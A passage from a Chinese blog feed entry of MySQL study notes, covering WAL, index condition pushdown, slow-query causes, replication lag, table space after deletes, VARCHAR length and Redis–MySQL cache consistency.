的优点：</strong></p><ol><li>读和写可以完全地并发执行，不会互相阻塞（但是写之间仍然不能并发）。</li><li>WAL 在大多数情况下，拥有更好的性能（因为无需每次写入时都要写两个文件）。</li><li>磁盘 I/O 行为更容易被预测。</li><li>使用更少的 fsync()操作，减少系统脆弱的问题。</li></ol><h1 id="什么是索引下推-INDEX-CONDITION-PUSHDOWN"><a href="#什么是索引下推-INDEX-CONDITION-PUSHDOWN" class="headerlink" title="什么是索引下推? INDEX CONDITION PUSHDOWN"></a>什么是索引下推? INDEX CONDITION PUSHDOWN</h1><p>索引下推是 <strong>MySQL 5.6</strong> 版本中提供的一项索引优化功能，可以在非聚簇索引遍历过程中，对索引中包含的字段先做判断，过滤掉不符合条件的记录，减少回表次数。<br>例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXPLAIN <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> S1 <span class="keyword">WHERE</span> key1 <span class="operator">&gt;</span> <span class="string">&#x27;z&#x27;</span> <span class="keyword">AND</span> key1 <span class="keyword">LIKE</span> <span class="string">&#x27;%a&#x27;</span>;</span><br></pre></td></tr></table></figure><ul><li>对于我们理解的而言，查询的顺序应该是：<ul><li>先找到 key1 &gt; ‘z’的行，然后回表查询，最后筛选key1 LIKE ‘%a’的数据返回</li></ul></li><li>但是对于查询优化器而言：<ul><li>先找到 key1 &gt; ‘z’的行，这个时候先不回表，继续执行key1 LIKE ‘%a’，直接在索引中挑选出来，最后把符合这两个条件的数据进行回表查找。此时减少了回表的次数</li></ul></li></ul><p>例如：<br><img src="/2022/05/20/Mysql/1657333401038-cf3aa45a-aacc-40da-a002-3aa628617fdb.png"><br>索引为zipcode,lastname,address 联合索引</p><ul><li>索引中包含了后面查询田中的字段，在回表前索引下推机制是会先做判断的</li></ul><h1 id="一条-Sql-语句查询偶尔慢会是什么原因"><a href="#一条-Sql-语句查询偶尔慢会是什么原因" class="headerlink" title="一条 Sql 语句查询偶尔慢会是什么原因?"></a>一条 Sql 语句查询偶尔慢会是什么原因?</h1><ol><li><strong>数据库刷新脏页</strong>当我们要往数据库中插入一条数据或者更新一条数据时，数据库会在内存中把对应字段的数据更新了，但是更新完毕之后，这些更新的字段并不会马上同步持久化到磁盘中去，而是把这些更新的记录写入到redo log日志中去，只有等到空闲的时候才会通过redo log里的日志把最新的数据同步到磁盘里。这里redo log的容量是有限的，所以如果数据库一直很忙且更新有很频繁，那么这个时候redo log很快就会被写满，从而没办法等到空闲时再把数据同步到磁盘，只能暂停其他操作，全身心来把数据同步到磁盘中去，造成的表象就是我们平时正常的SQL语句突然会执行的很慢。<strong>也就是说，数据库在同步数据到磁盘的时候就有可能会导致我们的SQL语句执行的很慢。</strong></li><li><strong>无法获取锁资源执行的时候遇到了表锁或者行锁。</strong>如果我们要执行的SQL语句，其涉及到的表正好别人在用并且加锁了，或者表并没有加锁，但是要使用到的某一行被加锁了，那么我们便无法获取锁，只能慢慢等待别人释放锁了。如果要判断是否真的在等待锁资源，我们可以使用”show processlist”命令来查看当前的状态。<h1 id="主从延迟要怎么解决"><a href="#主从延迟要怎么解决" class="headerlink" title="主从延迟要怎么解决?"></a>主从延迟要怎么解决?</h1></li></ol><ul><li><p>分库，将一个主库拆分为多个主库，每个主库的写并发就减少了几倍，此时主从延迟可以忽略不计。</p></li><li><p>打开 MySQL 支持的并行复制，多个库并行复制。如果说某个库的写入并发就是特别高，单库写并发达到了 2000/s，并行复制还是没意义。</p></li><li><p>重写代码，写代码的同学，要慎重，插入数据时立马查询可能查不到。</p></li><li><p>如果确实是存在必须先插入，立马要求就查询到，然后立马就要反过来执行一些操作，对这个查询<strong>设置直连主库</strong>。<strong>不推荐</strong>这种方法，你要是这么搞，读写分离的意义就丧失了。</p><h1 id="删除表数据后表的大小却没有变动-这是为什么"><a href="#删除表数据后表的大小却没有变动-这是为什么" class="headerlink" title="删除表数据后表的大小却没有变动,这是为什么?"></a>删除表数据后表的大小却没有变动,这是为什么?</h1><p>1、释放这些空间的操作本身就需要时间，如果每次删除数据都去进行这个操作，显然会影响性。<br>2、第二个原因则是因为表里后续还是会有新的数据插入，这些删除的数据空间可以在新的数据插入进来后重新利用即可，这样也避免了新增数据要去重新申请新的空间。</p><h1 id="为什么-VarChar-建议不要超过255"><a href="#为什么-VarChar-建议不要超过255" class="headerlink" title="为什么 VarChar 建议不要超过255?"></a>为什么 VarChar 建议不要超过255?</h1><p>首先VARCHAR不是定长的，而是可变的，所以一般业务开发我们都要尽量使用最小的长度来满足需求，以免浪费空间，影响性能，而既然是可变的长度，那就得有保存长度的地方，所以如果VARCHAR的长度设置在255以下，那只会使用额外一个字节来保存长度，但是如果VARCHAR的长度设置在255以上，那么就会使用额外的两个字节来保存长度，无形中就浪费了存储空间。</p><h1 id="Redis和MySQL如何保证数据的一致性"><a href="#Redis和MySQL如何保证数据的一致性" class="headerlink" title="Redis和MySQL如何保证数据的一致性"></a>Redis和MySQL如何保证数据的一致性</h1><p>问题：一份数据同时保存在数据库里和redis里面，数据发生变化的时候redis和MySQL变化是有先后顺序的</p></li><li><p>先更新数据库再更新缓存/先更新缓存再更新数据库</p><ul><li>一个改还没同步，另一个查 不一致</li></ul></li><li><p>先删除缓存再更新数据库</p></li><li><p>延时双删</p></li></ul><p>保证高一致性：<br>MQ手动应答确保redis删除<br>Canal组件监听binlog日志</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Mysql索引、Mysql优化、日志&lt;/p&gt;</summary>
    
    
    
    <category term="后端开发" scheme="https://winkygranger.github.io/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="mysql" scheme="https://winkygranger.github.io/tags/mysql/"/>
    
  </entry>
  
</feed>
